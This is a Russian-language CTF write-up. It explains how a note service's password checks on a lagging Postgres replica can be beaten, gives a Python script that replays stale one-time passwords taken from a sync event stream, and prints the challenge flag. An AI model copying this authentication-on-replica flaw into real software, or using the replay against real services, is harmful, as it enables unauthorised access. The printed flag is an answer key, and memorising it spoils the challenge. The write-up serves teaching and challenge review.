# Ничего не забыть: Write-up
> Можете посмотреть на [main.go](./app/main.go) и попытаться самостоятельно
> найти решение, а потом читать райтап.

## Что мы видим
Отрыв таск, видим перед собой интерфейс побитый на две части: события
синхронизации и управление заметкой. Изучив втоую понимаем, что у нас есть
одноразовый пароль, мы с его помощью совершаем какие-то операции и с каждой
операцией нам приходит новый пароль.

> Это могло быть неочевидно, если не заглянуть в код клиента

Первая часть хитрее. Изначально она пустая, но время от времени в ней появляются
события, которые выглядят как-то так:
```json
{"user": "you", "id": "note_id", "old_password": "ucucuga"}
```

Можно предположить, что кто-то независимо от нас изменяет заметки, а мы видим
лишь ID измененной заметки и старый пароль, который уже использован и не
подойдет. Пример использования такого лога: человек сидит с двух устройств и
хранит в голове пароль. Он делает заметку на одном устройстве, отправляет на
сервер, затем переходит за другое. Там ему высвечивается уведомление "Вы
создали\обновили новую заметку, введите пароль чтобы загрузить ее на это
устройство". И за счет этого можно делать примитивную синхронизацию.


Но нам для решения таска важно не это, а то, что нам дают старый, более
недействительный пароль. Мы пытаемся с ним что-то сделать, но каждый раз
получается ошибка 401 (неверный логин\пароль). Время от времени нам может
повезти и мы получим не 401 — разберемся, как превратить везение в систему.

## Что от нас скрыто
Сначала небольшой экскурс в основы архитектуры проектирования систем.

### Про репликацию
В большинстве современных сайтов, сервисов или API для уменьшения нагрузки на
базу данных применяется следующая схема: все запросы на запись идут в мастер, а
запросы чтения идут на пул реплик. Мастер — это узел, которая всегда содержит
самые свежие данные и только он может их обновлять (это связано с тем, что при
нескольких узлах записи данных могут возникнуть конфликты, которые никто уже не
решит). В кластере классических баз данных может быть только один мастер.
Реплики, с свою очередь, подхватывают изменения, которые были на мастере и
применяют их у себя, а сами работают только на чтение. Поскольку в этом мире всё
сложилось так, что большая часть операций — это чтение, то такая методика
позволяет сильно разгрузить мастер и обработать больше трафика.

Есть два основных направления репликации — синхронная и асинхронная.

- При синхронной репликации мастер дожидается, что изменения попали на реплику и
только затем отдает ответ клиенту, что все хорошо. Таким образом, изменений
вступают в силу одновременно и на мастере, и на реплике.

- Второй же вариант, асинхронная репликация, работает немного иначе: запрос
сразу же применяется на мастере и возвращается ответ клиенту, а реплика
когда-нибудь подхватит эти изменения и применит у себя. Такой подход дает
большую производительность, так как нам не нужно ждать ответа от реплики, чтобы
ответить клиенту, но дает меньше гарантий. А еще возникает необычный спецэффект,
именумый лагом репликации.

> Сейчас уже существуют системы с поддержкой multi-master или вообще без
> мастера, к примеру YDB, Cassandra, RiakDB. Они могут обрабатывать огромное
> количество данных и трафика, могут пережить отключение чуть ли не половины
> кластера, сами восстанавливают и решают конфликты. Но за это приходится
> платить сложностью внутреннего устройства базы данных и отсутствием некоторых
> фич (к примеру, в RiakDB нет ACID, но зато есть CDRT для решения проблемы
> конфликтов).

> Помимо реплицирования еще есть шардирование — это когда мы делим нашу базу
> данных на несколько разных кластеров, каждый из которых отвечает за свою часть
> данных (к примеру, один кластер для данных из России, другой для данных из
> Белоруссии). Это может увеличить быстродействие и маштабируемость всей
> системы, так как часто запросам не нужны все данные (вряд ли мы хотим
> одновременно искать кафешку и в России, и в Белоруссии), но за это приходится
> платить более сложной инфрастуктурой и не всегда это прозрачно для нашего
> приложения. Примером таких систем может быть Greenplum (Postgres) или Vitess
> (MySQL).

### Что было в таске
> Транзакция — процесс обработки нескольких запросов в базе данных, которые
> работают ровно с одним состоянием БД (то есть параллельные запросы не могут
> его испортить). Если запросы изменяют данные, то все изменения либо
> применяются, либо отклоняются. Частичных изменений быть не может.
> [Подробнее](https://ru.wikipedia.org/wiki/ACID).

В таске была настроена асинхронная репликация между двумя инстансами Postgres.
Один из них работал на запись, второй на чтение. Посмотрим участки кода из
[main.go](./app/main.go):

```go
func (s *Server) setNote(ctx context.Context, user, id, password, value string) (Response, error) {
	tx, err := s.master.BeginTx(ctx, &sql.TxOptions{Isolation: sql.LevelSerializable})
	if err != nil {
		return Response{}, err
	}
	// NOTE ignore error here
	defer tx.Rollback()
	err = s.store.Set(tx, user, id, password, value)
	if err != nil {
		return Response{}, err
	}
	newPassword := generatePassword()
	if err := s.store.UpdatePassword(tx, user, password, newPassword); err != nil {
		return Response{}, err
	}
	if err := tx.Commit(); err != nil {
		return Response{}, err
	}
	return Response{
		Contents: value,
		Password: newPassword,
	}, nil
}
```

Тут видно, что создается транзакция на мастере, затем вызывается метод
`store.Set` в который передается все необходимое, в том числе пароль. Можно
предположить, что внутри происходит валидация пароля. В этот же момент идет
рассылка всем о том, что произошло обновление (те самые sync events), все это
инкапсулировано в Store. Затем в этой же транзакции обновляется пароль,
транзакция завершается и отдается ответ клиенту.

Теперь чтение заметки:

```go
func (s *Server) getNote(ctx context.Context, user, id, password string) (Response, error) {
	tx, err := s.replica.BeginTx(ctx, &sql.TxOptions{Isolation: sql.LevelReadCommitted, ReadOnly: true})
	// NOTE ignore error here
	if err != nil {
		return Response{}, err
	}
	defer tx.Rollback()
	value, err := s.store.Get(tx, user, id, password)
	if err != nil {
		return Response{}, err
	}
	if err := tx.Commit(); err != nil {
		return Response{}, err
	}
	newPassword := generatePassword()
	go func() {
		tx, err := s.master.BeginTx(ctx, &sql.TxOptions{Isolation: sql.LevelSerializable})
		if err == nil {
			if err := s.store.UpdatePassword(tx, user, password, newPassword); err != nil {
				// NOTE ignore error here
				tx.Rollback()
			} else {
				// NOTE ignore error here
				tx.Commit()
			}
		}
	}()
	return Response{
		Contents: value,
		Password: newPassword,
	}, nil
}
```

Видим, что логика в целом похожая, но есть два важных отличия:
1. Мы делаем запрос на в мастер, а на реплику, следовательно проверка пароля
   тоже делается на реплике.
2. Обновление пароля происходит в фоне через отдельный запрос к мастеру. И если
   там произойдет ошибка, то мы об этом никак не узнаем (это необычная уловка
   реализации, на решение таска это никак не влияет).

## Как решать
Вспоминаем про лаг репликации: данные с мастера на реплику приходят не сразу. Но
пароль нам высылают сразу же. То есть, мы можем успеть использовать пароль, пока
он валидный на реплике, чтобы читать заметки. Затем просто возьмем новый пароль
и будем дальше читать заметки.

Но если мы попробуем так сделать, то мы потерпим неудачу. Тут надо вспомнить,
что лаг репликации может быть большим, поэтому как только мы увидели новый
пароль в логе, он не сразу же попал на реплику. То есть, мы еще немного ждем и в
какой-то момент реплика применяет пароль и мы можем читать заметки.

> В действительности новая заметка создавалась каждые 7-15 секунд, тогда как лаг
> репликации был 20 секунд (имитировалось через настройку
> `recovery_min_apply_delay` в Postgres). То есть, мы могли увидеть еще
> несколько паролей, прежде чем наш пароль подошел бы на реплике.

В итоге, все что нам остается — читать лог и пытаться применить пароли с
какого-то момента, а после заменить пароль следующим. Напишем для этого скрипт:

```python
from collections import deque
import sys
import json

import requests
from requests.auth import HTTPBasicAuth

url = input('url: ')
token = input('token: ')


queue = deque()
password_queue = deque()
last_pwd = ''

basic = HTTPBasicAuth(token, 'password')
with requests.get(f"{url}/sync/{token}/", stream=True) as sync:
    sync.raise_for_status()
    for line in sync.iter_lines():
        value = json.loads(line)
        queue.append(value['id'])
        password_queue.append(value['old_password'])
        print(value)
        while queue:
            elem = queue[0]
            r = requests.get(f"{url}/{token}/{elem}", auth=basic)
            while password_queue and r.status_code == 401:
                basic = HTTPBasicAuth(token, password_queue.popleft())
                r = requests.get(f"{url}/{token}/{elem}", auth=basic)
            if r.status_code == 200:
                queue.popleft()
                text = r.text
                if 'ugra_' in text:
                    print(text)
            elif r.status_code in (401, 404):
                break
            else:
                print(r.status_code, r.text)
                sys.exit(1)
```

Запускаем скрипт и начинаем перебирать заметки. В какой-то момент нам повезет и
мы наткнемся заметку с флагом.

> В таске каждая новая заметка бралась из некоего пула заметок через `fortune`.
> Поэтому, если вы очень невезучий, то вы могли прочитать много записок ученого
> и рецептов, но так и не увидеть флага. Либо же вы могли получить флаг с первой
> же заметкой (вероятность выпадения флага равна 7%). Но поскольку заметки
> создавались бесконечно и вы могли бесконечно их читать, рано или поздно вам
> должен был выпасть флаг.

Заметим, что мы не могли поменять заметку, так как мы никогда не знаем текущий
пароль на мастере, ибо получаем его только после изменения (что на самом деле
тоже неправда, ведь сообщение рассылается до того, как произошел коммит
транзакции с изменением пароля, но на наших маленьких маштабах попасть на это
было невероятно трудно).

Флаг: **ugra_cr0zy_sc1nce_run_0ut_1dadae9a2478**

# Постмортем

1. Неинтуитивный интерфейс. Надо было делать на русском и включить туда первый абзац из райтапа.
2. Мы не дали исходный код сервиса и участники не думали в сторону такого
   явления как лаг репликации (или вообще о репликации).
3. Некоторых людей смущало, что в логе происходят события от их собственного
   пользователя (который совпадал с токеном), а они ничего не делали. Надо было
   адекватно рассказать про идею приложения, и как им предлагалось пользоваться
   (опять же первый абзац райтапа).
4. Возможно, с точки зрения CTF, это была категория PPC / CTB, хотя основная идея
   которая здесь используется родилась и активно используется именно в
   проектировании веб-приложений.
